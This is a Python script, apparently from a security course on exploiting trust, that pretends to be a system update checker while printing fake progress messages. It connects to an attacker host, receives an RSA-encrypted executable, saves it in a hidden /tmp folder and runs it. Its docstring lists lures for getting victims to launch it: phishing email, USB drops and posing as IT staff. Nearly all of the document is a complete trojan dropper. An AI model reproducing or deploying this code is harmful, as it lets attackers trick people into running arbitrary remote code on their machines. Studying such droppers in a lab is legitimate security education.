#!/usr/bin/env python3
"""
system_update_check.py

Appears to be a routine system utility that checks for updates.
Actually connects outbound to the attacker, receives an RSA-encrypted
executable, decrypts it, and runs it.

Social engineering delivery examples (CSC431 Exploitation of Trust):
  - Email: "Run this compatibility checker before the meeting"
  - USB drop: labeled "IT Diagnostics Tool"
  - Shared folder: placed as "update_tool.py"
  - Impersonation: "Hey, IT asked me to have everyone run this"
"""

import socket
import os
import json
import subprocess
import time
import platform

ATTACKER_IP = "ATTACKER_IP_HERE"
ATTACKER_PORT = 4444
ENCRYPTED_BLOCK = 256
WORK_DIR = os.path.join("/tmp", ".cache_update")
MAX_RETRIES = 30

def recv_exact(conn, n):
    data = b""
    while len(data) < n:
        pkt = conn.recv(n - len(data))
        if not pkt:
            return None
        data += pkt
    return data

def show_fake_output():
    print("System Update Checker v2.4.1")
    print(f"OS: {platform.system()} {platform.release()}")
    print(f"Host: {platform.node()}")
    print("")
    print("Checking for updates...", end="", flush=True)
    time.sleep(1)
    print(" contacting server...", end="", flush=True)

def main():
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization

    show_fake_output()
    os.makedirs(WORK_DIR, exist_ok=True)

    privkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pubkey = privkey.public_key()
    pubkey_der = pubkey.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    sock = None
    for _ in range(MAX_RETRIES):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            break
        except (ConnectionRefusedError, socket.timeout, OSError):
            time.sleep(2)
    else:
        print(" no updates available.")
        return

    print(" connected.")
    print("Downloading update...", end="", flush=True)

    sock.sendall(len(pubkey_der).to_bytes(4, "big") + pubkey_der)

    metadata = json.loads(recv_exact(sock, 1024).strip())
    filename = metadata["filename"]
    filesize = metadata["filesize"]
    total_chunks = metadata["chunks"]

    output_path = os.path.join(WORK_DIR, filename)
    received = 0

    with open(output_path, "wb") as f:
        for i in range(total_chunks):
            enc = recv_exact(sock, ENCRYPTED_BLOCK)
            if not enc:
                break
            dec = privkey.decrypt(enc, padding.PKCS1v15())
            f.write(dec)
            received += len(dec)

    sock.close()
    os.chmod(output_path, 0o755)

    if received == filesize:
        print(" done.")
        print("Installing update... ", end="", flush=True)
        time.sleep(0.5)
        print("complete.\n")
        subprocess.run([output_path], cwd=WORK_DIR)
    else:
        print(" failed.")

if __name__ == "__main__":
    main()